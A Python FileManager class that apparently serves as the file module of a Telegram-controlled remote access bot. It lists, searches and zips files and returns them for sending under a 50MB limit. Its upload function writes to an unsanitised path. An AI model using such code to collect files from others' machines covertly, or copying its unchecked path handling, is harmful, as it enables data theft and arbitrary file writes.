import os
import json
import zipfile
import io
import hashlib

class FileManager:
    def __init__(self):
        self.base_dir = os.path.expanduser("~")

    def list_files(self, path="."):
        try:
            items = os.listdir(path)
            result = []
            for item in items:
                full_path = os.path.join(path, item)
                is_dir = os.path.isdir(full_path)
                size = os.path.getsize(full_path) if not is_dir else 0
                mtime = os.path.getmtime(full_path) if not is_dir else 0
                result.append({
                    "name": item,
                    "is_dir": is_dir,
                    "size": size,
                    "mtime": mtime
                })
            return {"status": "success", "data": result}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def get_directory_size(self, path="."):
        try:
            total_size = 0
            for root, dirs, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        total_size += os.path.getsize(file_path)
                    except OSError:
                        pass
            return {"status": "success", "size": total_size}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def search_files(self, path="", pattern="", case_sensitive=False):
        try:
            matches = []
            for root, dirs, files in os.walk(path):
                for file in files:
                    name = file if case_sensitive else file.lower()
                    pat = pattern if case_sensitive else pattern.lower()
                    if pat in name:
                        full_path = os.path.join(root, file)
                        try:
                            matches.append({
                                "name": file,
                                "path": full_path,
                                "size": os.path.getsize(full_path),
                                "relative": os.path.relpath(full_path, path)
                            })
                        except OSError:
                            pass
            return {"status": "success", "data": matches}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def get_file_details(self, file_path):
        try:
            if not os.path.exists(file_path):
                return {"status": "error", "message": "File not found"}
            stat = os.stat(file_path)
            return {
                "status": "success",
                "data": {
                    "name": os.path.basename(file_path),
                    "path": file_path,
                    "size": stat.st_size,
                    "created": stat.st_ctime,
                    "modified": stat.st_mtime,
                    "accessed": stat.st_atime,
                    "is_dir": os.path.isdir(file_path),
                    "permissions": oct(stat.st_mode & 0o777)
                }
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def hash_file(self, file_path, algorithm="sha256"):
        try:
            h = hashlib.new(algorithm)
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(8192)
                    if not chunk:
                        break
                    h.update(chunk)
            return {"status": "success", "data": {"hash": h.hexdigest(), "algorithm": algorithm, "path": file_path}}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def zip_folder(self, folder_path):
        try:
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, folder_path)
                        try:
                            zip_file.write(file_path, arcname)
                        except OSError:
                            continue
            data = zip_buffer.getvalue()
            if len(data) > self.MAX_UPLOAD:
                return {"status": "error",
                        "message": f"folder too large for Telegram ({len(data) // 1048576}MB > 50MB)"}
            return {"status": "success", "data": data}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    MAX_UPLOAD = 50 * 1024 * 1024

    def download_file(self, file_path):
        if os.path.isdir(file_path):
            zipped = self.zip_folder(file_path)
            if zipped.get("status") != "success":
                return zipped
            name = os.path.basename(file_path.rstrip("\\/")) or "folder"
            return {
                "status": "success",
                "_document": zipped["data"],
                "filename": f"{name}.zip",
                "size": len(zipped["data"]),
            }

        try:
            size = os.path.getsize(file_path)
        except OSError as e:
            return {"status": "error", "message": str(e)}

        if size > self.MAX_UPLOAD:
            return {"status": "error",
                    "message": f"file too large for Telegram ({size // 1048576}MB > 50MB)"}

        try:
            with open(file_path, 'rb') as f:
                content = f.read()
            return {
                "status": "success",
                "_document": content,
                "filename": os.path.basename(file_path),
                "size": len(content),
            }
        except Exception as e:
            return {"status": "error", "message": f"{type(e).__name__}: {e}"}

    def upload_file(self, data_bytes, filename):
        try:
            path = os.path.join(self.base_dir, filename)
            with open(path, 'wb') as f:
                f.write(data_bytes)
            return {"status": "success", "message": f"Uploaded {filename}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def create_json_header(self, filename=None, filesize=0, is_dir=False):
        header = {"type": "file_transfer", "filename": filename if filename else "", "filesize": filesize, "is_dir": is_dir}
        return json.dumps(header).encode('utf-8')

    def parse_header(self, raw_data):
        try:
            header_str = raw_data[:2048].decode('utf-8')
            if '}' in header_str:
                idx = header_str.rfind('}') + 1
                header_json = json.loads(header_str[:idx])
                return header_json, raw_data[idx:]
        except Exception:
            pass
        return None, raw_data

    def list_drives(self):
        try:
            if os.name == 'nt':
                import string
                drives = []
                for d in string.ascii_uppercase:
                    p = f"{d}:\\"
                    if os.path.exists(p):
                        drives.append(p)
                return {"status": "success", "data": drives}
            else:
                return {"status": "success", "data": ["/"]}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def get_recent_files(self, path=".", days=7):
        try:
            import time
            cutoff = time.time() - (days * 86400)
            recent = []
            for root, dirs, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        mtime = os.path.getmtime(file_path)
                        if mtime > cutoff:
                            recent.append({"name": file, "path": file_path, "size": os.path.getsize(file_path), "modified": mtime})
                    except OSError:
                        pass
            recent.sort(key=lambda x: x['modified'], reverse=True)
            return {"status": "success", "data": recent}
        except Exception as e:
            return {"status": "error", "message": str(e)}